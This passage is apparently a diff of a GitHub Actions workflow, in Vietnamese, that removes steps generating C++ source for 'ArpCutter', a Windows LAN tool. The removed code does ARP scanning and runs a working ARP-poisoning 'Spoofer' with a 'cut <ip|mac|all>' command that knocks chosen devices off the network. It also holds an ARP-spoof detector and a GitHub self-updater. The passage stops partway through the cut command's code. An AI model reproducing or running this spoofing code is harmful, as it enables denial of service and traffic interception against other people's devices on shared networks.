-          void arpSend(pcap_t* h, uint16_t op, const Mac& sha, uint32_t spa,
-                       const Mac& tha, uint32_t tpa) {
-              if (!h) return;
-
-              uint8_t buf[64]{};
-              EthHdr* e = (EthHdr*)buf;
-              ArpHdr* a = (ArpHdr*)(buf + sizeof(EthHdr));
-
-              if (tha.zero()) memset(e->dst, 0xFF, 6);
-              else            memcpy(e->dst, tha.b, 6);
-
-              memcpy(e->src, sha.b, 6);
-              e->type = htons(ETH_ARP);
-
-              a->htype = htons(1);
-              a->ptype = htons(0x0800);
-              a->hlen  = 6;
-              a->plen  = 4;
-              a->op    = htons(op);
-              memcpy(a->sha, sha.b, 6);
-              a->spa = htonl(spa);
-              memcpy(a->tha, tha.b, 6);
-              a->tpa = htonl(tpa);
-
-              std::lock_guard<std::mutex> lk(g_txMtx);
-              pcap_sendpacket(h, buf, 60);
-          }
-
-          bool arpResolve(pcap_t* h, const Mac& myMac, uint32_t myIp,
-                          uint32_t targetIp, Mac& outMac, int timeoutMs) {
-              if (!h) return false;
-
-              for (int i = 0; i < 3; i++)
-                  arpSend(h, ARP_REQ, myMac, myIp, Mac{}, targetIp);
-
-              DWORD t0 = GetTickCount();
-              while (GetTickCount() - t0 < (DWORD)timeoutMs) {
-                  pcap_pkthdr* hdr = nullptr;
-                  const u_char* data = nullptr;
-                  int r = pcap_next_ex(h, &hdr, &data);
-                  if (r <= 0) continue;
-                  if (hdr->caplen < sizeof(EthHdr) + sizeof(ArpHdr)) continue;
-
-                  ArpHdr* a = (ArpHdr*)(data + sizeof(EthHdr));
-                  if (ntohs(a->op) != ARP_REPLY) continue;
-                  if (ntohl(a->spa) != targetIp) continue;
-
-                  memcpy(outMac.b, a->sha, 6);
-                  return outMac.valid();
-              }
-              return false;
-          }
-
-          static std::string reverseName(uint32_t ip) {
-              sockaddr_in sa{};
-              sa.sin_family = AF_INET;
-              sa.sin_addr.s_addr = htonl(ip);
-              char host[NI_MAXHOST]{};
-              if (getnameinfo((sockaddr*)&sa, sizeof(sa), host, sizeof(host),
-                              nullptr, 0, NI_NAMEREQD) == 0)
-                  return host;
-              return "";
-          }
-
-          int arpScan(pcap_t* h, const Mac& myMac, uint32_t myIp, uint32_t mask,
-                      std::vector<Device>& out, int totalMs, bool withNames) {
-              if (!h || mask == 0) return 0;
-
-              uint32_t net = myIp & mask;
-              uint32_t bc  = net | ~mask;
-              uint32_t start = net + 1;
-              uint32_t end   = (bc > start) ? bc : start + 1;
-              if (end - start > 4096) end = start + 4095;
-
-              int sent = 0;
-              for (uint32_t ip = start; ip < end; ip++) {
-                  if (ip == myIp) continue;
-                  arpSend(h, ARP_REQ, myMac, myIp, Mac{}, ip);
-                  if (++sent % 64 == 0) Sleep(3);
-              }
-
-              std::map<std::string, size_t> seenIdx;
-              DWORD t0 = GetTickCount();
-              while (GetTickCount() - t0 < (DWORD)totalMs) {
-                  pcap_pkthdr* hdr = nullptr;
-                  const u_char* data = nullptr;
-                  int r = pcap_next_ex(h, &hdr, &data);
-                  if (r <= 0) continue;
-                  if (hdr->caplen < sizeof(EthHdr) + sizeof(ArpHdr)) continue;
-
-                  ArpHdr* a = (ArpHdr*)(data + sizeof(EthHdr));
-                  uint16_t op = ntohs(a->op);
-                  if (op != ARP_REPLY && op != ARP_REQ) continue;
-
-                  uint32_t spa = ntohl(a->spa);
-                  if (spa == 0 || spa == myIp) continue;
-                  if ((spa & mask) != net) continue;
-
-                  Mac m;
-                  memcpy(m.b, a->sha, 6);
-                  if (!m.valid() || m.bcast()) continue;
-                  if (m.b[0] & 0x01) continue;
-
-                  std::string ms  = m.str();
-                  std::string ips = u32ToIp(spa);
-
-                  auto it = seenIdx.find(ms);
-                  if (it == seenIdx.end()) {
-                      Device d;
-                      d.mac = ms;
-                      d.ip  = ips;
-                      d.first = nowStamp();
-                      d.last  = nowStamp();
-                      d.seen  = 1;
-                      seenIdx[ms] = out.size();
-                      out.push_back(d);
-                  } else {
-                      Device& d = out[it->second];
-                      d.last = nowStamp();
-                      d.seen++;
-                      if (ips != d.ip) d.ip = ips;
-                  }
-              }
-
-              if (withNames) {
-                  for (auto& d : out) {
-                      if (!d.name.empty()) continue;
-                      std::string n = reverseName(ipToU32(d.ip));
-                      if (!n.empty() && n != d.ip) d.name = n;
-                  }
-              }
-              return (int)out.size();
-          }
-
-          void Spoofer::add(uint32_t ip, const Mac& m) {
-              t_.push_back({ ip, m });
-          }
-
-          void Spoofer::start() {
-              run_ = true;
-              th_ = std::thread([this] { loop(); });
-          }
-
-          void Spoofer::stop() {
-              if (run_) {
-                  run_ = false;
-                  if (th_.joinable()) th_.join();
-              }
-              restore();
-          }
-
-          void Spoofer::loop() {
-              int tick = 0;
-              while (run_) {
-                  for (auto& t : t_) {
-                      arpSend(h, ARP_REPLY, myMac, gwIp, t.mac, t.ip);
-                      if (bothWay)
-                          arpSend(h, ARP_REPLY, myMac, t.ip, gwMac, gwIp);
-                  }
-                  if (++tick % 10 == 0) {
-                      for (auto& t : t_)
-                          arpSend(h, ARP_REPLY, myMac, gwIp, Mac{}, t.ip);
-                  }
-                  Sleep(500);
-              }
-          }
-
-          void Spoofer::restore() {
-              for (int i = 0; i < 5; i++) {
-                  for (auto& t : t_) {
-                      arpSend(h, ARP_REPLY, gwMac, gwIp, t.mac, t.ip);
-                      arpSend(h, ARP_REPLY, t.mac, t.ip, gwMac, gwIp);
-                  }
-                  Sleep(120);
-              }
-          }
-          '@ | Set-Content -Encoding utf8 src/arp.cpp
-
-      - name: Sinh db.hpp + db.cpp
-        shell: pwsh
+      - name: Ket qua
+        if: always()
         run: |
-          $ErrorActionPreference = 'Stop'
-
-          @'
-          // db.hpp
-          #pragma once
-          #include "common.hpp"
-
-          struct Db {
-              std::string lastScan;
-              std::string lastCheck;
-              std::vector<Device> devices;
-
-              bool load();
-              bool save();
-
-              Device* byMac(const std::string& mac);
-              Device* byIp(const std::string& ip);
-              Device* byIndex(int i);
-
-              int merge(const std::vector<Device>& found);
-              std::string path() const;
-          };
-          '@ | Set-Content -Encoding utf8 src/db.hpp
-
-          @'
-          // db.cpp
-          #include "db.hpp"
-          #include <iostream>
-
-          static std::string jesc(const std::string& s) {
-              std::string r;
-              for (char c : s) {
-                  if (c == '"' || c == '\\') { r += '\\'; r += c; }
-                  else if (c == '\n') r += ' ';
-                  else r += c;
-              }
-              return r;
-          }
-
-          static std::string jget(const std::string& o, const std::string& key) {
-              std::string pat = "\"" + key + "\"";
-              size_t p = o.find(pat);
-              if (p == std::string::npos) return "";
-              p = o.find(':', p);
-              if (p == std::string::npos) return "";
-              p++;
-              while (p < o.size() && (o[p] == ' ' || o[p] == '\t' || o[p] == '\n' || o[p] == '\r')) p++;
-              if (p < o.size() && o[p] == '"') {
-                  p++;
-                  std::string r;
-                  while (p < o.size() && o[p] != '"') {
-                      if (o[p] == '\\' && p + 1 < o.size()) p++;
-                      r += o[p++];
-                  }
-                  return r;
-              }
-              std::string r;
-              while (p < o.size() && (isdigit((unsigned char)o[p]) || o[p] == '-')) r += o[p++];
-              return r;
-          }
-
-          std::string Db::path() const { return dataDir() + "\\devices.json"; }
-
-          bool Db::load() {
-              std::string s = readFile(path());
-              if (s.empty()) return false;
-
-              lastScan  = jget(s, "lastScan");
-              lastCheck = jget(s, "lastCheck");
-
-              size_t dp = s.find("\"devices\"");
-              if (dp == std::string::npos) return true;
-              size_t a = s.find('[', dp);
-              size_t e = s.rfind(']');
-              if (a == std::string::npos || e == std::string::npos || a > e) return true;
-
-              size_t p = a + 1;
-              while (p < e) {
-                  size_t b = s.find('{', p);
-                  if (b == std::string::npos || b > e) break;
-                  int depth = 0;
-                  size_t q = b;
-                  for (; q < e; q++) {
-                      if (s[q] == '{') depth++;
-                      else if (s[q] == '}') { depth--; if (depth == 0) { q++; break; } }
-                  }
-                  std::string obj = s.substr(b, q - b);
-                  Device d;
-                  d.mac   = jget(obj, "mac");
-                  d.ip    = jget(obj, "ip");
-                  d.name  = jget(obj, "name");
-                  d.first = jget(obj, "first");
-                  d.last  = jget(obj, "last");
-                  d.seen  = atoi(jget(obj, "seen").c_str());
-                  if (!d.mac.empty()) devices.push_back(d);
-                  p = q;
-              }
-              return true;
-          }
-
-          bool Db::save() {
-              std::string s;
-              s += "{\n";
-              s += "  \"lastScan\": \"" + jesc(lastScan) + "\",\n";
-              s += "  \"lastCheck\": \"" + jesc(lastCheck) + "\",\n";
-              s += "  \"devices\": [\n";
-              for (size_t i = 0; i < devices.size(); i++) {
-                  const Device& d = devices[i];
-                  s += "    {\"mac\":\"" + jesc(d.mac) + "\",\"ip\":\"" + jesc(d.ip) +
-                       "\",\"name\":\"" + jesc(d.name) + "\",\"first\":\"" + jesc(d.first) +
-                       "\",\"last\":\"" + jesc(d.last) + "\",\"seen\":" +
-                       std::to_string(d.seen) + "}";
-                  if (i + 1 < devices.size()) s += ",";
-                  s += "\n";
-              }
-              s += "  ]\n}\n";
-              return writeFile(path(), s);
-          }
-
-          Device* Db::byMac(const std::string& mac) {
-              std::string k = Mac::parse(mac).str();
-              for (auto& d : devices) if (d.mac == k) return &d;
-              return nullptr;
-          }
-
-          Device* Db::byIp(const std::string& ip) {
-              for (auto& d : devices) if (d.ip == ip) return &d;
-              return nullptr;
-          }
-
-          Device* Db::byIndex(int i) {
-              if (i < 0 || i >= (int)devices.size()) return nullptr;
-              return &devices[i];
-          }
-
-          int Db::merge(const std::vector<Device>& found) {
-              int newCount = 0;
-              for (const auto& f : found) {
-                  Device* d = byMac(f.mac);
-                  if (!d) {
-                      Device nd = f;
-                      nd.first = nowStamp();
-                      nd.last  = nowStamp();
-                      nd.seen  = 1;
-                      nd.isNew = true;
-                      devices.push_back(nd);
-                      newCount++;
-                  } else {
-                      if (f.ip != d->ip) d->ip = f.ip;
-                      if (!f.name.empty()) d->name = f.name;
-                      d->last = nowStamp();
-                      d->seen++;
-                  }
-              }
-              return newCount;
-          }
-          '@ | Set-Content -Encoding utf8 src/db.cpp
-
-      - name: Sinh protect.hpp + protect.cpp
-        shell: pwsh
-        run: |
-          $ErrorActionPreference = 'Stop'
-
-          @'
-          // protect.hpp
-          #pragma once
-          #include "common.hpp"
-          #include <pcap.h>
-
-          void protectRun(pcap_t* h, const Mac& myMac, uint32_t myIp,
-                          const Mac& gwMac, uint32_t gwIp,
-                          bool aggressive, bool addStatic, std::atomic<bool>& run);
-
-          void watchRun(pcap_t* h, const Mac& myMac, uint32_t myIp,
-                        const Mac& gwMac, uint32_t gwIp, std::atomic<bool>& run);
-
-          void addStaticArp(const std::string& ip, const std::string& macDash);
-          '@ | Set-Content -Encoding utf8 src/protect.hpp
-
-          @'
-          // protect.cpp
-          #include "protect.hpp"
-          #include "arp.hpp"
-          #include <iostream>
-
-          void addStaticArp(const std::string& ip, const std::string& macDash) {
-              runCapture("arp -d " + ip + " >nul 2>&1");
-              runCapture("arp -s " + ip + " " + macDash);
-          }
-
-          struct Prot {
-              pcap_t*  h;
-              Mac      myMac, gwMac;
-              uint32_t myIp, gwIp;
-              bool     aggressive;
-              bool     addStatic;
-
-              std::map<std::string, DWORD> lastWarn;
-              std::map<std::string, int>   flood;
-              DWORD    winStart = 0;
-              DWORD    lastGrat = 0;
-              DWORD    lastReassert = 0;
-              int      spoofGw = 0, spoofMe = 0, floods = 0;
-
-              bool warn(std::string key, int gapMs = 8000) {
-                  DWORD now = GetTickCount();
-                  auto it = lastWarn.find(key);
-                  if (it != lastWarn.end() && now - it->second < (DWORD)gapMs) return false;
-                  lastWarn[key] = now;
-                  return true;
-              }
-
-              void reassertGateway() {
-                  for (int i = 0; i < 3; i++) {
-                      arpSend(h, ARP_REPLY, gwMac, gwIp, Mac{}, gwIp);
-                      Sleep(20);
-                  }
-              }
-
-              void reassertSelf() {
-                  for (int i = 0; i < 3; i++) {
-                      arpSend(h, ARP_REPLY, myMac, myIp, Mac{}, myIp);
-                      arpSend(h, ARP_REPLY, myMac, myIp, gwMac, gwIp);
-                      Sleep(20);
-                  }
-              }
-
-              void handle(const u_char* data, uint32_t caplen) {
-                  if (caplen < sizeof(EthHdr) + sizeof(ArpHdr)) return;
-                  ArpHdr* a = (ArpHdr*)(data + sizeof(EthHdr));
-                  uint16_t op = ntohs(a->op);
-                  if (op != ARP_REPLY && op != ARP_REQ) return;
-
-                  Mac sha;  memcpy(sha.b, a->sha, 6);
-                  uint32_t spa = ntohl(a->spa);
-                  if (!sha.valid() || sha.bcast()) return;
-
-                  DWORD now = GetTickCount();
-                  if (now - winStart > 1000) { flood.clear(); winStart = now; }
-                  int& cnt = flood[sha.str()];
-                  cnt++;
-                  if (cnt == 260 && warn("flood:" + sha.str(), 5000)) {
-                      floods++;
-                      logLine("WARN", "ARP FLOOD tu " + sha.str() + " (" +
-                              u32ToIp(spa) + ") > 260 goi/giay");
-                      if (aggressive) reassertGateway();
-                  }
-
-                  if (spa == gwIp && sha != gwMac) {
-                      if (warn("gw:" + sha.str())) {
-                          spoofGw++;
-                          logLine("WARN", "ARP SPOOF: " + sha.str() +
-                                  " dang mao danh router " + u32ToIp(gwIp));
-                      }
-                      if (aggressive) reassertGateway();
-                  }
-
-                  if (spa == myIp && sha != myMac) {
-                      if (warn("me:" + sha.str())) {
-                          spoofMe++;
-                          logLine("WARN", "ARP SPOOF: " + sha.str() +
-                                  " dang mao danh IP may ban " + u32ToIp(myIp));
-                      }
-                      if (aggressive) reassertSelf();
-                  }
-              }
-          };
-
-          static void runLoop(Prot& p, std::atomic<bool>& run, bool watchOnly) {
-              char f[] = "arp";
-              bpf_program fp{};
-              if (pcap_compile(p.h, &fp, f, 1, 0xFFFFFFFF) == 0) {
-                  pcap_setfilter(p.h, &fp);
-                  pcap_freecode(&fp);
-              }
-
-              if (p.addStatic) {
-                  addStaticArp(u32ToIp(p.gwIp), p.gwMac.win());
-                  logLine("OK", "Da them ARP tinh cho router " + u32ToIp(p.gwIp) +
-                          " -> " + p.gwMac.str());
-              }
-
-              p.reassertSelf();
-              p.reassertGateway();
-
-              logLine("NET", "Dang bao ve. Nhan Ctrl+C de dung.");
-              while (run) {
-                  pcap_pkthdr* hdr = nullptr;
-                  const u_char* data = nullptr;
-                  int r = pcap_next_ex(p.h, &hdr, &data);
-                  if (r > 0) p.handle(data, hdr->caplen);
-
-                  DWORD now = GetTickCount();
-
-                  if (!watchOnly && now - p.lastGrat > 2000) {
-                      arpSend(p.h, ARP_REPLY, p.myMac, p.myIp, p.gwMac, p.gwIp);
-                      p.lastGrat = now;
-                  }
-                  if (!watchOnly && now - p.lastReassert > 5000) {
-                      p.reassertGateway();
-                      p.lastReassert = now;
-                  }
-                  Sleep(5);
-              }
-
-              if (p.addStatic) {
-                  runCapture("arp -d " + u32ToIp(p.gwIp) + " >nul 2>&1");
-                  logLine("NET", "Da xoa ARP tinh cua router.");
-              }
-              std::cout << "\n--- Bao cao ---\n"
-                        << "  Spoof nham router : " << p.spoofGw << "\n"
-                        << "  Spoof nham may ban: " << p.spoofMe << "\n"
-                        << "  Dot ARP flood     : " << p.floods  << "\n";
-          }
-
-          void protectRun(pcap_t* h, const Mac& myMac, uint32_t myIp,
-                          const Mac& gwMac, uint32_t gwIp,
-                          bool aggressive, bool addStatic, std::atomic<bool>& run) {
-              Prot p{};
-              p.h = h; p.myMac = myMac; p.myIp = myIp;
-              p.gwMac = gwMac; p.gwIp = gwIp;
-              p.aggressive = aggressive; p.addStatic = addStatic;
-              runLoop(p, run, false);
-          }
-
-          void watchRun(pcap_t* h, const Mac& myMac, uint32_t myIp,
-                        const Mac& gwMac, uint32_t gwIp, std::atomic<bool>& run) {
-              Prot p{};
-              p.h = h; p.myMac = myMac; p.myIp = myIp;
-              p.gwMac = gwMac; p.gwIp = gwIp;
-              p.aggressive = false; p.addStatic = false;
-              runLoop(p, run, true);
-          }
-          '@ | Set-Content -Encoding utf8 src/protect.cpp
-
-      - name: Sinh updater.hpp + updater.cpp
-        shell: pwsh
-        run: |
-          $ErrorActionPreference = 'Stop'
-
-          @'
-          // updater.hpp
-          #pragma once
-          #include "common.hpp"
-
-          struct Release {
-              bool        ok = false;
-              std::string tag;
-              std::string version;
-              std::string url;
-              std::string notes;
-          };
-
-          int  cmpVersion(const std::string& a, const std::string& b);
-          Release fetchLatestRelease();
-          bool downloadTo(const std::string& url, const std::string& destPath);
-          bool applyUpdate(const Release& r);
-          '@ | Set-Content -Encoding utf8 src/updater.hpp
-
-          @'
-          // updater.cpp
-          #include "updater.hpp"
-          #include <winhttp.h>
-          #include <iostream>
-
-          #pragma comment(lib, "winhttp.lib")
-
-          static bool winHttpGet(const std::wstring& url, std::string* bodyOut,
-                                 const std::wstring& savePath) {
-              URL_COMPONENTS uc{};
-              uc.dwStructSize = sizeof(uc);
-              wchar_t host[256]{};
-              wchar_t path[2048]{};
-              uc.lpszHostName = host;  uc.dwHostNameLength = 255;
-              uc.lpszUrlPath  = path;  uc.dwUrlPathLength  = 2047;
-
-              if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc))
-                  return false;
-
-              bool https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
-
-              HINTERNET s = WinHttpOpen(L"ArpCutter/1.0",
-                                        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-                                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-              if (!s) return false;
-
-              HINTERNET c = WinHttpConnect(s, host, uc.nPort, 0);
-              if (!c) { WinHttpCloseHandle(s); return false; }
-
-              HINTERNET rq = WinHttpOpenRequest(c, L"GET", path, nullptr,
-                                                WINHTTP_NO_REFERER,
-                                                WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                                https ? WINHTTP_FLAG_SECURE : 0);
-              if (!rq) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return false; }
-
-              DWORD policy = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
-              WinHttpSetOption(rq, WINHTTP_OPTION_REDIRECT_POLICY, &policy, sizeof(policy));
-              WinHttpAddRequestHeaders(rq,
-                  L"User-Agent: ArpCutter\r\nAccept: application/vnd.github+json\r\n",
-                  -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
-
-              bool ok = false;
-              if (WinHttpSendRequest(rq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
-                  WinHttpReceiveResponse(rq, nullptr)) {
-
-                  DWORD status = 0, slen = sizeof(status);
-                  WinHttpQueryHeaders(rq,
-                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                      WINHTTP_HEADER_NAME_BY_INDEX, &status, &slen, WINHTTP_NO_HEADER_INDEX);
-
-                  if (status == 200) {
-                      FILE* f = nullptr;
-                      if (!savePath.empty())
-                          f = _wfopen(savePath.c_str(), L"wb");
-
-                      DWORD avail = 0;
-                      do {
-                          avail = 0;
-                          if (!WinHttpQueryDataAvailable(rq, &avail)) break;
-                          if (avail == 0) break;
-                          std::vector<char> buf(avail);
-                          DWORD read = 0;
-                          if (!WinHttpReadData(rq, buf.data(), avail, &read)) break;
-                          if (read == 0) break;
-                          if (f) fwrite(buf.data(), 1, read, f);
-                          if (bodyOut) bodyOut->append(buf.data(), read);
-                      } while (avail > 0);
-
-                      if (f) fclose(f);
-                      ok = true;
-                  }
-              }
-
-              WinHttpCloseHandle(rq);
-              WinHttpCloseHandle(c);
-              WinHttpCloseHandle(s);
-              return ok;
-          }
-
-          int cmpVersion(const std::string& a0, const std::string& b0) {
-              auto parts = [](const std::string& s) {
-                  std::vector<int> v;
-                  std::string c;
-                  for (char ch : s) {
-                      if (ch == '.') { v.push_back(atoi(c.c_str())); c.clear(); }
-                      else if (isdigit((unsigned char)ch)) c += ch;
-                  }
-                  if (!c.empty()) v.push_back(atoi(c.c_str()));
-                  return v;
-              };
-              std::string a = a0, b = b0;
-              if (!a.empty() && (a[0] == 'v' || a[0] == 'V')) a = a.substr(1);
-              if (!b.empty() && (b[0] == 'v' || b[0] == 'V')) b = b.substr(1);
-
-              auto va = parts(a), vb = parts(b);
-              size_t n = va.size() > vb.size() ? va.size() : vb.size();
-              for (size_t i = 0; i < n; i++) {
-                  int x = i < va.size() ? va[i] : 0;
-                  int y = i < vb.size() ? vb[i] : 0;
-                  if (x != y) return x < y ? -1 : 1;
-              }
-              return 0;
-          }
-
-          Release fetchLatestRelease() {
-              Release r;
-              std::string api = "https://api.github.com/repos/" GH_OWNER "/" GH_REPO "/releases/latest";
-              std::string body;
-              if (!winHttpGet(toWide(api), &body, L"")) {
-                  logLine("ERR", "Khong ket noi duoc GitHub API.");
-                  return r;
-              }
-
-              auto grab = [&](const std::string& key) -> std::string {
-                  std::string pat = "\"" + key + "\":\"";
-                  size_t p = body.find(pat);
-                  if (p == std::string::npos) return "";
-                  p += pat.size();
-                  size_t e = body.find('"', p);
-                  if (e == std::string::npos) return "";
-                  return body.substr(p, e - p);
-              };
-
-              r.tag     = grab("tag_name");
-              r.notes   = grab("body");
-              r.version = r.tag;
-              if (!r.version.empty() && (r.version[0] == 'v' || r.version[0] == 'V'))
-                  r.version = r.version.substr(1);
-
-              size_t p = 0;
-              while (true) {
-                  p = body.find("browser_download_url", p);
-                  if (p == std::string::npos) break;
-                  size_t q = body.find('"', p + 21);
-                  if (q == std::string::npos) break;
-                  size_t e = body.find('"', q + 1);
-                  if (e == std::string::npos) break;
-                  std::string url = body.substr(q + 1, e - q - 1);
-                  if (url.rfind(".exe") != std::string::npos) { r.url = url; break; }
-                  p = e;
-              }
-
-              r.ok = !r.tag.empty() && !r.url.empty();
-              return r;
-          }
-
-          bool downloadTo(const std::string& url, const std::string& destPath) {
-              return winHttpGet(toWide(url), nullptr, toWide(destPath)) &&
-                     fileExists(destPath);
-          }
-
-          bool applyUpdate(const Release& r) {
-              std::string exe = exePath();
-              std::string tmp = exe + ".new";
-
-              DeleteFileA(tmp.c_str());
-              logLine("NET", "Dang tai ban " + r.version + " ...");
-              if (!downloadTo(r.url, tmp)) {
-                  logLine("ERR", "Tai that bai.");
-                  return false;
-              }
-
-              std::string bat = dataDir() + "\\update.bat";
-              std::string script =
-                  "@echo off\r\n"
-                  "setlocal\r\n"
-                  ":wait\r\n"
-                  "ping -n 2 127.0.0.1 >nul\r\n"
-                  "move /y \"" + tmp + "\" \"" + exe + "\" >nul 2>&1\r\n"
-                  "if errorlevel 1 goto wait\r\n"
-                  "start \"\" \"" + exe + "\"\r\n"
-                  "del \"%~f0\"\r\n";
-              writeFile(bat, script);
-
-              std::string cmd = "cmd.exe /c \"" + bat + "\"";
-              STARTUPINFOA si{};
-              si.cb = sizeof(si);
-              PROCESS_INFORMATION pi{};
-              if (!CreateProcessA(nullptr, (char*)cmd.c_str(), nullptr, nullptr, FALSE,
-                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-                  logLine("ERR", "Khong chay duoc updater.");
-                  return false;
-              }
-              CloseHandle(pi.hProcess);
-              CloseHandle(pi.hThread);
-              logLine("OK", "Da cap nhat len " + r.version + ". Tool se tu khoi dong lai.");
-              return true;
-          }
-          '@ | Set-Content -Encoding utf8 src/updater.cpp
-
-      - name: Sinh main.cpp (phan 1)
-        shell: pwsh
-        run: |
-          $ErrorActionPreference = 'Stop'
-
-          @'
-          // main.cpp
-          #include "common.hpp"
-          #include "net.hpp"
-          #include "arp.hpp"
-          #include "db.hpp"
-          #include "protect.hpp"
-          #include "updater.hpp"
-
-          #include <iostream>
-
-          #pragma comment(linker, "/manifestuac:\"level='requireAdministrator' uiAccess='false'\"")
-
-          static std::atomic<bool> g_run{ true };
-
-          static BOOL WINAPI ctrlHandler(DWORD) {
-              g_run = false;
-              return TRUE;
-          }
-
-          struct Opts {
-              std::string cmd;
-              std::string target;
-              bool both = false;
-              bool block = false;
-              bool checkOnly = false;
-              int  seconds = 0;
-              int  iface = -1;
-          };
-
-          static void banner() {
-              printf("\n");
-              printf("  ==========================================\n");
-              printf("   ArpCutter v%s   (build %s)\n", APP_VERSION, BUILD_DATE);
-              printf("   Cat mang / chong ARP spoof cho LAN nha\n");
-              printf("  ==========================================\n\n");
-          }
-
-          static void usage() {
-              printf(
-                  "CACH DUNG: ArpCutter <lenh> [tuy chon]\n\n"
-                  "  scan                 Quet LAN, cap nhat thiet bi (MAC = ID)\n"
-                  "  list [--new]         Liet ke thiet bi da biet\n"
-                  "  cut <ip|mac|#so|all> Cat mang thiet bi (ARP poison)\n"
-                  "      --both           Poison ca 2 chieu\n"
-                  "      --seconds N      Tu tra mang sau N giay\n"
-                  "  restore              Tra mang ve binh thuong\n"
-                  "  protect [--block]    TU BAO VE may ban + router 192.168.1.1\n"
-                  "  watch                Chi theo doi ARP, canh bao tan cong\n"
-                  "  update [--check]     Kiem tra / tai / cap nhat ban moi\n"
-                  "  status               In card mang, router, thiet bi\n\n"
-                  "TUY CHON:  --iface N   Chon card mang so N (xem lenh status)\n\n"
-                  "Vi du:\n"
-                  "  ArpCutter scan\n"
-                  "  ArpCutter cut 192.168.1.15\n"
-                  "  ArpCutter cut all --seconds 60\n"
-                  "  ArpCutter protect --block\n");
-          }
-
-          static Opts parseArgs(int argc, char** argv) {
-              Opts o;
-              for (int i = 1; i < argc; i++) {
-                  std::string a = argv[i];
-                  if (a == "--both")         o.both = true;
-                  else if (a == "--block")   o.block = true;
-                  else if (a == "--check")   o.checkOnly = true;
-                  else if (a == "--iface" && i + 1 < argc)   o.iface = atoi(argv[++i]);
-                  else if (a == "--seconds" && i + 1 < argc) o.seconds = atoi(argv[++i]);
-                  else if (o.cmd.empty())    o.cmd = a;
-                  else if (o.target.empty()) o.target = a;
-              }
-              return o;
-          }
-
-          static Adapter* chooseAdapter(std::vector<Adapter>& list, int forced) {
-              int i = pickAdapterIndex(list, forced);
-              if (i < 0) { logLine("ERR", "Khong tim thay card mang nao dang hoat dong."); return nullptr; }
-              return &list[i];
-          }
-
-          static bool ensureGateway(pcap_t* h, const Adapter& a, Mac& gwMac, uint32_t& gwIp) {
-              gwIp = defaultGateway(a.ip);
-              if (!gwIp) gwIp = ipToU32("192.168.1.1");
-
-              for (int i = 0; i < 3; i++)
-                  if (arpResolve(h, a.mac, ipToU32(a.ip), gwIp, gwMac, 1500)) break;
-
-              if (!gwMac.valid()) {
-                  logLine("ERR", "Khong tim thay router " + u32ToIp(gwIp));
-                  return false;
-              }
-              logLine("OK", "Router: " + u32ToIp(gwIp) + " -> " + gwMac.str());
-              return true;
-          }
-
-          static int cmdStatus(std::vector<Adapter>& list) {
-              printAdapters(list);
-              Adapter* a = chooseAdapter(list, -1);
-              if (!a) return 1;
-              printf("Card dang dung  : %s  (%s)\n", a->ip.c_str(), a->mac.str().c_str());
-              printf("Subnet          : %s\n", a->mask.c_str());
-              printf("Router          : %s\n", u32ToIp(defaultGateway(a->ip)).c_str());
-
-              Db db;
-              db.load();
-              printf("Thiet bi da biet: %d\n", (int)db.devices.size());
-              printf("Lan quet cuoi   : %s\n", db.lastScan.empty()  ? "(chua)" : db.lastScan.c_str());
-              printf("Lan check update: %s\n", db.lastCheck.empty() ? "(chua)" : db.lastCheck.c_str());
-              printf("Thu muc du lieu : %s\n\n", dataDir().c_str());
-              return 0;
-          }
-
-          static int cmdScan(Adapter& a, Db& db, bool quiet = false) {
-              pcap_t* h = openAdapter(a);
-              if (!h) return 1;
-
-              Mac gwMac;
-              uint32_t gwIp = 0;
-              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }
-
-              std::vector<Device> found;
-              logLine("NET", "Dang quet LAN ...");
-              arpScan(h, a.mac, ipToU32(a.ip), ipToU32(a.mask), found, 6000, true);
-
-              Device gw;
-              gw.mac  = gwMac.str();
-              gw.ip   = u32ToIp(gwIp);
-              gw.name = "ROUTER";
-              found.push_back(gw);
-
-              int n = db.merge(found);
-              db.lastScan = todayStr();
-              db.save();
-
-              if (!quiet) {
-                  logLine("OK", "Quet xong: " + std::to_string(found.size()) +
-                          " thiet bi, " + std::to_string(n) + " thiet bi MOI.");
-                  printf("\n%-18s %-16s %-22s %s\n", "MAC (ID)", "IP", "TEN", "LAN CUOI");
-                  for (auto& d : db.devices) {
-                      printf("%-18s %-16s %-22s %s%s\n",
-                             d.mac.c_str(), d.ip.c_str(),
-                             d.name.empty() ? "-" : d.name.c_str(),
-                             d.last.c_str(), d.isNew ? "   <== MOI" : "");
-                  }
-                  printf("\n");
-              } else {
-                  logLine("OK", "Quet tu dong: " + std::to_string(n) + " thiet bi moi.");
-              }
-
-              pcap_close(h);
-              return 0;
-          }
-
-          static int cmdList(Db& db, bool onlyNew) {
-              if (db.devices.empty()) { logLine("WARN", "Chua co du lieu. Chay: ArpCutter scan"); return 0; }
-              printf("\n%-18s %-16s %-22s %-6s %s\n", "MAC (ID)", "IP", "TEN", "SEEN", "LAN CUOI");
-              int c = 0;
-              for (auto& d : db.devices) {
-                  if (onlyNew && !d.isNew) continue;
-                  printf("%-18s %-16s %-22s %-6d %s\n",
-                         d.mac.c_str(), d.ip.c_str(),
-                         d.name.empty() ? "-" : d.name.c_str(), d.seen, d.last.c_str());
-                  c++;
-              }
-              printf("\nTong: %d\n\n", c);
-              return 0;
-          }
-          '@ | Set-Content -Encoding utf8 src/main.cpp
-
-      - name: Sinh main.cpp (phan 2)
-        shell: pwsh
-        run: |
-          $ErrorActionPreference = 'Stop'
-
-          @'
-          static int cmdCut(Adapter& a, Db& db, const Opts& o) {
-              pcap_t* h = openAdapter(a);
-              if (!h) return 1;
-
-              Mac gwMac;
-              uint32_t gwIp = 0;
-              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }
-
